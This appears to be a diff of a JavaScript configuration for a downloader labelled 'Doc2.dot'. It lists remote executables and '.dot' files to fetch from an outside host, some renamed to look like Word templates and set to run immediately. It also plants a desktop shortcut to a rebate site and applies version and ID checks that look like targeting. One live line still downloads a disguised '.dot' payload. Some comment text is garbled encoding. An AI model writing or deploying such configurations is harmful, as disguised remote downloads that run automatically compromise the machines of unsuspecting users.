@@ -1,12 +1,12 @@
 //
 trace("*----Doc2.dot----")
 var ___gconfig = {
-		validcondition:{PID:{min:"0000000000000001",max:"fffffffffffffff2"}  ,osver:{min:5,max:6},datver:{min:0,max:10000}},
-		//validcondition:{PID:{min:"0",max:"F"}  ,osver:{min:5,max:6},datver:{min:5,max:16}},
+		validcondition:{PID:{min:"0000000000000001",max:"FFFFFFFFFFFFFFF2"},osver:{min:5,max:6},datver:{min:5,max:16}},
 		//installlist:[{id:10008,name:"Dbgview.exe",url:"http://www.by81.com/05/Dbgview.exe", md5:"", invalidcondition:function(){} ,param:""},
 		//						 {id:10009,name:"cmd.exe",url:"http://www.by81.com/05/cmd.exe.dot", md5:"", invalidcondition:function(){} ,param:" /c echo Éý¼¶ÖÐ & pause",runimmediately:1},	
 		//						 {id:100010,name:"ovxSetup.exe",url:"http://www.by81.com/05/ovxSetup.exe.dot", md5:"", invalidcondition:function(){} ,param:"", runimmediately:1}],
 		//desktopiconlist:[{id:20000,name:"·µÀû.ur", md5:"", iconPrivateProfileString:{URL:"http://www.51fanli.com",IconFileName:"favicon.ico",IconFile:"http://www.51fanli.com/favicon.ico"}, param:""}] ,
+		//userdefinedlist:[{id:30001,name:"Doc3.dot", md5:"", url:"http://www.by81.com/05/Doc3.dot"}]
 		userdefinedlist:[{id:30002,name:"Doc30002.dot", md5:"", url:"http://www.by81.com/05/Doc30002.dot"}]
 	}
 	//alert(___gconfig.validcondition.PID.min)
